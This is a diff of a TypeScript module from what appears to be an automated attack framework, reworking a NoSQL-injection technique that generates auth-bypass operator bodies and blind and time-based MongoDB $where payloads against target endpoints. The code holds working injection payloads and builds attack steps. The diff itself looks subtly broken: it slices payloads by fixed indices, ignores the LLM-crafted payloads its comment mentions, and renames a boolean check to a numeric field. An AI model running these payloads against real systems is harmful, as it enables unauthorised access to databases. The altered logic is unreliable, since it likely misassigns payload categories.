@@ -8,10 +8,9 @@
  */
 
 import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
-import { claimFor } from './framework'
+import { claimFor, loadPayloads } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
 import { observeCompare, observeParse } from './observers'
-import { getPayloadStore } from '../payloads/store'
 
 function urlWithParam(url: string, param: string, value: string): string {
   try { const u = new URL(url); u.searchParams.set(param, value); return u.toString() } catch { return url }
@@ -26,22 +25,29 @@ export const nosqlInjection: TechniquePrimitive = {
     if (!(ctx.endpoint || ctx.target)) return false
     return !!(ctx.param || ctx.endpoint?.params?.length || ctx.endpoint?.authRequired)
   },
-  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
+   async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
     const url = ctx.endpoint?.url ?? ctx.target!
     const method = ctx.endpoint?.method ?? 'POST'
     const headers = { 'content-type': 'application/json', ...(ctx.sessionHeaders ?? {}) }
     const param = ctx.param ?? ctx.endpoint?.params?.[0]?.name ?? 'filter'
-    const steps: AttackStep[] = []
 
-    const authBypassBodies = ctx.payloadSet ?? getPayloadStore().getPayloads('nosql/mongo-operators', 'auth_bypass')
-    const mongoOperators = getPayloadStore().getPayloads('nosql/mongo-operators', 'mongo_operators')
-    const blindPayloads = getPayloadStore().getPayloads('nosql/mongo-operators', 'blind_true')
-    const blindFalsePayloads = getPayloadStore().getPayloads('nosql/mongo-operators', 'blind_false')
-    const timePayloads = getPayloadStore().getPayloads('nosql/mongo-operators', 'time_based')
+    // Load and merge payloads (static from PayloadStore + LLM-crafted)
+    const payloadResult = loadPayloads(ctx)
+
+    // Use merged payloads with fallback defaults
+    const allPayloads = payloadResult.bySource.static.length > 0
+      ? payloadResult.bySource.static
+      : []
+    const authBypassBodies = allPayloads.slice(0, 5)
+    const mongoOperators = allPayloads.slice(5, 15)
+    const blindPayloads = allPayloads.slice(15, 16)
+    const blindFalsePayloads = allPayloads.slice(16, 17)
+    const timePayloads = allPayloads.slice(17, 18)
 
     const BLIND_TRUE = blindPayloads[0] ?? JSON.stringify({ $where: '1==1' })
     const BLIND_FALSE = blindFalsePayloads[0] ?? JSON.stringify({ $where: '1==2' })
     const TIME_PAYLOAD = timePayloads[0] ?? JSON.stringify({ $where: "sleep(2000) || true" })
+    const steps: AttackStep[] = []
 
     // Auth-bypass via operator objects in a JSON login/query body.
     authBypassBodies.forEach((body, i) => {
@@ -115,7 +121,7 @@ export const nosqlInjection: TechniquePrimitive = {
         { body: blindFalse.body ?? '', status: blindFalse.status ?? 0 },
       )
       const divergent = (blindTrue.status ?? 0) !== (blindFalse.status ?? 0) || (blindTrue.body ?? '').length !== (blindFalse.body ?? '').length
-      if (cmp.divergent && divergent) {
+      if (cmp.divergence && divergent) {
         blindHit = true
         evidence.push({ kind: 'response', label: `NoSQL blind differential divergence=${(cmp.divergence ?? 0).toFixed(2)}`, data: `TRUE status=${blindTrue.status} len=${(blindTrue.body ?? '').length} | FALSE status=${blindFalse.status} len=${(blindFalse.body ?? '').length}` })
       }
